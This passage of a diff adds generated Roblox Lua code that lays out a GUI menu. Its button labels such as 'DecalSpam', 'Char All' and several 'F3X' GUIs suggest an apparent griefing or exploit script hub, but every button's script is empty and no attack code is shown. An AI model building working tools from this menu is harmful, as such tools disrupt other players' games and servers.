+UI["39"]["TextWrapped"] = true
+UI["39"]["BorderSizePixel"] = 2
+UI["39"]["TextSize"] = 14
+UI["39"]["TextScaled"] = true
+UI["39"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["39"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["39"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["39"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["39"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["39"]["Text"] = [[DecalSpam 4]]
+UI["39"]["Position"] = UDim2.new(0.73509, 0, 0.18014, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextButton.LocalScript \\ --
+UI["3a"] = Instance.new("LocalScript", UI["39"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.disco \\ --
+UI["3b"] = Instance.new("TextButton", UI["12"])
+UI["3b"]["TextWrapped"] = true
+UI["3b"]["BorderSizePixel"] = 2
+UI["3b"]["TextSize"] = 14
+UI["3b"]["TextScaled"] = true
+UI["3b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["3b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["3b"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["3b"]["Name"] = [[disco]]
+UI["3b"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["3b"]["Text"] = [[Disco]]
+UI["3b"]["Position"] = UDim2.new(0.49538, 0, 0.05967, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.disco.LocalScript \\ --
+UI["3c"] = Instance.new("LocalScript", UI["3b"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.hint \\ --
+UI["3d"] = Instance.new("TextButton", UI["12"])
+UI["3d"]["TextWrapped"] = true
+UI["3d"]["BorderSizePixel"] = 2
+UI["3d"]["TextSize"] = 14
+UI["3d"]["TextScaled"] = true
+UI["3d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["3d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["3d"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["3d"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["3d"]["Name"] = [[hint]]
+UI["3d"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["3d"]["Text"] = [[Hint]]
+UI["3d"]["Position"] = UDim2.new(0.73488, 0, 0.05967, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.hint.LocalScript \\ --
+UI["3e"] = Instance.new("LocalScript", UI["3d"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.mama soy un angry bird \\ --
+UI["3f"] = Instance.new("TextButton", UI["12"])
+UI["3f"]["TextWrapped"] = true
+UI["3f"]["BorderSizePixel"] = 2
+UI["3f"]["TextSize"] = 14
+UI["3f"]["TextScaled"] = true
+UI["3f"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["3f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["3f"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["3f"]["Name"] = [[mama soy un angry bird]]
+UI["3f"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["3f"]["Text"] = [[Mama soy un angry bird]]
+UI["3f"]["Position"] = UDim2.new(0.24769, 0, 0.05967, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.mama soy un angry bird.LocalScript \\ --
+UI["40"] = Instance.new("LocalScript", UI["3f"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.mario.exe \\ --
+UI["41"] = Instance.new("TextButton", UI["12"])
+UI["41"]["TextWrapped"] = true
+UI["41"]["BorderSizePixel"] = 2
+UI["41"]["TextSize"] = 14
+UI["41"]["TextScaled"] = true
+UI["41"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["41"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["41"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["41"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["41"]["Name"] = [[mario.exe]]
+UI["41"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["41"]["Text"] = [[Mario.exe]]
+UI["41"]["Position"] = UDim2.new(0.24769, 0, 0, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.mario.exe.LocalScript \\ --
+UI["42"] = Instance.new("LocalScript", UI["41"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Pickle567421 gui f3x \\ --
+UI["43"] = Instance.new("TextButton", UI["12"])
+UI["43"]["TextWrapped"] = true
+UI["43"]["BorderSizePixel"] = 2
+UI["43"]["TextSize"] = 14
+UI["43"]["TextScaled"] = true
+UI["43"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["43"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["43"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["43"]["Name"] = [[Pickle567421 gui f3x]]
+UI["43"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["43"]["Text"] = [[Pickle567421 gui f3x]]
+UI["43"]["Position"] = UDim2.new(0, 0, 0.35401, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Pickle567421 gui f3x.LocalScript \\ --
+UI["44"] = Instance.new("LocalScript", UI["43"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Yellow2Spooky GUI F3X \\ --
+UI["45"] = Instance.new("TextButton", UI["12"])
+UI["45"]["TextWrapped"] = true
+UI["45"]["BorderSizePixel"] = 2
+UI["45"]["TextSize"] = 14
+UI["45"]["TextScaled"] = true
+UI["45"]["TextColor3"] = Color3.fromRGB(255, 201, 0)
+UI["45"]["BackgroundColor3"] = Color3.fromRGB(163, 163, 163)
+UI["45"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["45"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["45"]["Name"] = [[Yellow2Spooky GUI F3X]]
+UI["45"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["45"]["Text"] = [[Yellow2Spooky GUI F3X]]
+UI["45"]["Position"] = UDim2.new(0.24742, 0, 0.35515, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Yellow2Spooky GUI F3X.LocalScript \\ --
+UI["46"] = Instance.new("LocalScript", UI["45"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Yellow2Spooky GUI F3X.UIGradient \\ --
+UI["47"] = Instance.new("UIGradient", UI["45"])
+UI["47"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 205, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 108, 3))}
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.g00by665len gui f3x \\ --
+UI["48"] = Instance.new("TextButton", UI["12"])
+UI["48"]["TextWrapped"] = true
+UI["48"]["BorderSizePixel"] = 2
+UI["48"]["TextSize"] = 14
+UI["48"]["TextScaled"] = true
+UI["48"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["48"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["48"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["48"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["48"]["Name"] = [[g00by665len gui f3x]]
+UI["48"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["48"]["Text"] = [[g00by665len gui f3x]]
+UI["48"]["Position"] = UDim2.new(0.49072, 0, 0.35515, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.g00by665len gui f3x.LocalScript \\ --
+UI["49"] = Instance.new("LocalScript", UI["48"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.1x1x1x1 gui \\ --
+UI["4a"] = Instance.new("TextButton", UI["12"])
+UI["4a"]["TextWrapped"] = true
+UI["4a"]["BorderSizePixel"] = 2
+UI["4a"]["TextSize"] = 14
+UI["4a"]["TextScaled"] = true
+UI["4a"]["TextColor3"] = Color3.fromRGB(255, 0, 0)
+UI["4a"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/IndieFlower.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["4a"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["4a"]["Name"] = [[1x1x1x1 gui]]
+UI["4a"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["4a"]["Text"] = [[1x1x1x1 GUI F3X]]
+UI["4a"]["Position"] = UDim2.new(0.73402, 0, 0.35515, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.1x1x1x1 gui.LocalScript \\ --
+UI["4b"] = Instance.new("LocalScript", UI["4a"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Realm gh00stkidd and yellow2spooky F3X \\ --
+UI["4c"] = Instance.new("TextButton", UI["12"])
+UI["4c"]["TextWrapped"] = true
+UI["4c"]["BorderSizePixel"] = 2
+UI["4c"]["TextSize"] = 14
+UI["4c"]["TextScaled"] = true
+UI["4c"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["4c"]["BackgroundColor3"] = Color3.fromRGB(133, 133, 133)
+UI["4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["4c"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["4c"]["Name"] = [[Realm gh00stkidd and yellow2spooky F3X]]
+UI["4c"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["4c"]["Text"] = [[F3X REALM ghOOstkidd93 and Yellow2Spooky]]
+UI["4c"]["Position"] = UDim2.new(-0.00206, 0, 0.41197, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Realm gh00stkidd and yellow2spooky F3X.LocalScript \\ --
+UI["4d"] = Instance.new("LocalScript", UI["4c"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Realm gh00stkidd and yellow2spooky F3X.UIGradient \\ --
+UI["4e"] = Instance.new("UIGradient", UI["4c"])
+UI["4e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(122, 122, 122)),ColorSequenceKeypoint.new(0.050, Color3.fromRGB(122, 122, 122)),ColorSequenceKeypoint.new(0.111, Color3.fromRGB(122, 122, 122)),ColorSequenceKeypoint.new(0.194, Color3.fromRGB(148, 148, 148)),ColorSequenceKeypoint.new(0.374, Color3.fromRGB(122, 122, 122)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 205, 0))}
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Char all \\ --
+UI["4f"] = Instance.new("TextButton", UI["12"])
+UI["4f"]["TextWrapped"] = true
+UI["4f"]["BorderSizePixel"] = 2
+UI["4f"]["TextSize"] = 14
+UI["4f"]["TextScaled"] = true
+UI["4f"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["4f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["4f"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["4f"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["4f"]["Name"] = [[Char all]]
+UI["4f"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["4f"]["Text"] = [[Char All]]
+UI["4f"]["Position"] = UDim2.new(0.24536, 0, 0.41197, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Char all.LocalScript \\ --
+UI["50"] = Instance.new("LocalScript", UI["4f"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.ANTI-SKID \\ --
+UI["51"] = Instance.new("TextButton", UI["12"])
+UI["51"]["TextWrapped"] = true
+UI["51"]["BorderSizePixel"] = 2
+UI["51"]["TextSize"] = 14
+UI["51"]["TextScaled"] = true
+UI["51"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["51"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["51"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["51"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["51"]["Name"] = [[ANTI-SKID]]
+UI["51"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["51"]["Text"] = [[ANTI-SKID]]
+UI["51"]["Position"] = UDim2.new(0.49072, 0, 0.41197, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.ANTI-SKID.LocalScript \\ --
+UI["52"] = Instance.new("LocalScript", UI["51"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Fog \\ --
+UI["53"] = Instance.new("TextButton", UI["12"])
+UI["53"]["TextWrapped"] = true
+UI["53"]["BorderSizePixel"] = 2
+UI["53"]["TextSize"] = 14
+UI["53"]["TextScaled"] = true
+UI["53"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["53"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["53"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["53"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["53"]["Name"] = [[Fog]]
+UI["53"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["53"]["Text"] = [[Fog]]
+UI["53"]["Position"] = UDim2.new(0.73402, 0, 0.41144, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Fog.LocalScript \\ --
+UI["54"] = Instance.new("LocalScript", UI["53"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Night \\ --
+UI["55"] = Instance.new("TextButton", UI["12"])
+UI["55"]["TextWrapped"] = true
+UI["55"]["BorderSizePixel"] = 2
+UI["55"]["TextSize"] = 14
+UI["55"]["TextScaled"] = true
+UI["55"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["55"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["55"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["55"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["55"]["Name"] = [[Night]]
+UI["55"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["55"]["Text"] = [[Night]]
+UI["55"]["Position"] = UDim2.new(-0.00206, 0, 0.46986, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Night.LocalScript \\ --
+UI["56"] = Instance.new("LocalScript", UI["55"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Shedletsky \\ --
+UI["57"] = Instance.new("TextButton", UI["12"])
+UI["57"]["TextWrapped"] = true
+UI["57"]["BorderSizePixel"] = 2
+UI["57"]["TextSize"] = 14
+UI["57"]["TextScaled"] = true
+UI["57"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["57"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["57"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["57"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["57"]["Name"] = [[Shedletsky]]
+UI["57"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["57"]["Text"] = [[Shedletsky]]
+UI["57"]["Position"] = UDim2.new(0.2433, 0, 0.46986, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Shedletsky.LocalScript \\ --
+UI["58"] = Instance.new("LocalScript", UI["57"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.polaria \\ --
+UI["59"] = Instance.new("TextButton", UI["12"])
+UI["59"]["TextWrapped"] = true
+UI["59"]["BorderSizePixel"] = 2
+UI["59"]["TextSize"] = 14
+UI["59"]["TextScaled"] = true
+UI["59"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["59"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/Roboto.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["59"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["59"]["Name"] = [[polaria]]
+UI["59"]["BorderColor3"] = Color3.fromRGB(116, 0, 255)
+UI["59"]["Text"] = [[POLARIA]]
+UI["59"]["Position"] = UDim2.new(0.48866, 0, 0.46986, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.polaria.LocalScript \\ --
+UI["5a"] = Instance.new("LocalScript", UI["59"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Rotate Parts \\ --
+UI["5b"] = Instance.new("TextButton", UI["12"])
+UI["5b"]["TextWrapped"] = true
+UI["5b"]["BorderSizePixel"] = 2
+UI["5b"]["TextSize"] = 14
+UI["5b"]["TextScaled"] = true
+UI["5b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["5b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["5b"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["5b"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["5b"]["Name"] = [[Rotate Parts]]
+UI["5b"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["5b"]["Text"] = [[Rotate Parts]]
+UI["5b"]["Position"] = UDim2.new(0.73402, 0, 0.46986, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Rotate Parts.LocalScript \\ --
+UI["5c"] = Instance.new("LocalScript", UI["5b"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Swamp Madness \\ --
+UI["5d"] = Instance.new("TextButton", UI["12"])
+UI["5d"]["TextWrapped"] = true
+UI["5d"]["BorderSizePixel"] = 2
+UI["5d"]["TextSize"] = 14
+UI["5d"]["TextScaled"] = true
+UI["5d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["5d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["5d"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["5d"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["5d"]["Name"] = [[Swamp Madness]]
+UI["5d"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["5d"]["Text"] = [[Swamp Madness]]
+UI["5d"]["Position"] = UDim2.new(-0.00206, 0, 0.5305, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.Swamp Madness.LocalScript \\ --
+UI["5e"] = Instance.new("LocalScript", UI["5d"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.job \\ --
+UI["5f"] = Instance.new("ImageButton", UI["12"])
+UI["5f"]["BorderSizePixel"] = 0
+-- [ERROR] cannot convert ImageContent
+UI["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["5f"]["Image"] = [[rbxassetid://137707964386564]]
+UI["5f"]["Size"] = UDim2.new(0, 116, 0, 55)
+UI["5f"]["Name"] = [[job]]
+UI["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["5f"]["Position"] = UDim2.new(0.2433, 0, 0.52707, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.job.LocalScript \\ --
+UI["60"] = Instance.new("LocalScript", UI["5f"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextLabel \\ --
+UI["61"] = Instance.new("TextLabel", UI["12"])
+UI["61"]["TextWrapped"] = true
+UI["61"]["BorderSizePixel"] = 0
+UI["61"]["TextSize"] = 14
+UI["61"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255)
+UI["61"]["TextColor3"] = Color3.fromRGB(0, 0, 0)
+UI["61"]["FontFace"] = Font.new([[rbxasset://fonts/families/Creepster.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["61"]["Size"] = UDim2.new(0, 91, 0, 5)
+UI["61"]["BackgroundTransparency"] = 1
+UI["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0)
+UI["61"]["Text"] = [[JOB APPLICATION]]
+UI["61"]["Position"] = UDim2.new(0.26804, 0, 0.55606, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme \\ --
+UI["62"] = Instance.new("ScrollingFrame", UI["2"])
+UI["62"]["Active"] = true
+UI["62"]["BorderSizePixel"] = 2
+UI["62"]["Position"] = UDim2.new(0.03058, 0, 0.51794, 0)
+UI["62"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["62"]["Size"] = UDim2.new(0, 486, 0, 202)
+UI["62"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0)
+UI["62"]["Name"] = [[Theme]]
+UI["62"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["63"] = Instance.new("TextButton", UI["62"])
+UI["63"]["TextWrapped"] = true
+UI["63"]["BorderSizePixel"] = 2
+UI["63"]["TextSize"] = 23
+UI["63"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["63"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["63"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["63"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["63"]["Name"] = [[Theme]]
+UI["63"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["63"]["Text"] = [[F**k Him F**k Her]]
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["64"] = Instance.new("LocalScript", UI["63"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["65"] = Instance.new("TextButton", UI["62"])
+UI["65"]["TextWrapped"] = true
+UI["65"]["BorderSizePixel"] = 2
+UI["65"]["TextSize"] = 14
+UI["65"]["TextScaled"] = true
+UI["65"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["65"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["65"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["65"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["65"]["Name"] = [[Theme]]
+UI["65"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["65"]["Text"] = [[music of Ricardo Milos]]
+UI["65"]["Position"] = UDim2.new(0.24769, 0, 0, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["66"] = Instance.new("LocalScript", UI["65"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["67"] = Instance.new("TextButton", UI["62"])
+UI["67"]["TextWrapped"] = true
+UI["67"]["BorderSizePixel"] = 2
+UI["67"]["TextSize"] = 14
+UI["67"]["TextScaled"] = true
+UI["67"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["67"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["67"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["67"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["67"]["Name"] = [[Theme]]
+UI["67"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["67"]["Text"] = [[JUMPSTYLE.exe]]
+UI["67"]["Position"] = UDim2.new(0.49538, 0, 0, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["68"] = Instance.new("LocalScript", UI["67"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["69"] = Instance.new("TextButton", UI["62"])
+UI["69"]["TextWrapped"] = true
+UI["69"]["BorderSizePixel"] = 2
+UI["69"]["TextSize"] = 14
+UI["69"]["TextScaled"] = true
+UI["69"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["69"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["69"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["69"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["69"]["Name"] = [[Theme]]
+UI["69"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["69"]["Text"] = [[Diamonds]]
+UI["69"]["Position"] = UDim2.new(0.73509, 0, 0, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["6a"] = Instance.new("LocalScript", UI["69"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["6b"] = Instance.new("TextButton", UI["62"])
+UI["6b"]["TextWrapped"] = true
+UI["6b"]["BorderSizePixel"] = 2
+UI["6b"]["TextSize"] = 23
+UI["6b"]["TextScaled"] = true
+UI["6b"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["6b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["6b"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["6b"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["6b"]["Name"] = [[Theme]]
+UI["6b"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["6b"]["Text"] = [[Bodypartz]]
+UI["6b"]["Position"] = UDim2.new(0, 0, 0.05682, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["6c"] = Instance.new("LocalScript", UI["6b"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["6d"] = Instance.new("TextButton", UI["62"])
+UI["6d"]["TextWrapped"] = true
+UI["6d"]["BorderSizePixel"] = 2
+UI["6d"]["TextSize"] = 14
+UI["6d"]["TextScaled"] = true
+UI["6d"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["6d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["6d"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["6d"]["Size"] = UDim2.new(0, 117, 0, 50)
+UI["6d"]["Name"] = [[Theme]]
+UI["6d"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["6d"]["Text"] = [[You're mine (BALDI SONG)]]
+UI["6d"]["Position"] = UDim2.new(0.24769, 0, 0.05682, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["6e"] = Instance.new("LocalScript", UI["6d"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["6f"] = Instance.new("TextButton", UI["62"])
+UI["6f"]["TextWrapped"] = true
+UI["6f"]["BorderSizePixel"] = 2
+UI["6f"]["TextSize"] = 14
+UI["6f"]["TextScaled"] = true
+UI["6f"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["6f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["6f"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["6f"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["6f"]["Name"] = [[Theme]]
+UI["6f"]["BorderColor3"] = Color3.fromRGB(255, 171, 0)
+UI["6f"]["Text"] = [[Type Beat]]
+UI["6f"]["Position"] = UDim2.new(0.49538, 0, 0.05682, 0)
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme.LocalScript \\ --
+UI["70"] = Instance.new("LocalScript", UI["6f"])
+
+
+-- // StarterGui.ScreenGui.ImageLabel.Theme.Theme \\ --
+UI["71"] = Instance.new("TextButton", UI["62"])
+UI["71"]["TextWrapped"] = true
+UI["71"]["BorderSizePixel"] = 2
+UI["71"]["TextSize"] = 14
+UI["71"]["TextScaled"] = true
+UI["71"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
+UI["71"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0)
+UI["71"]["FontFace"] = Font.new([[rbxasset://fonts/families/RomanAntique.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+UI["71"]["Size"] = UDim2.new(0, 114, 0, 50)
+UI["71"]["Name"] = [[Theme]]
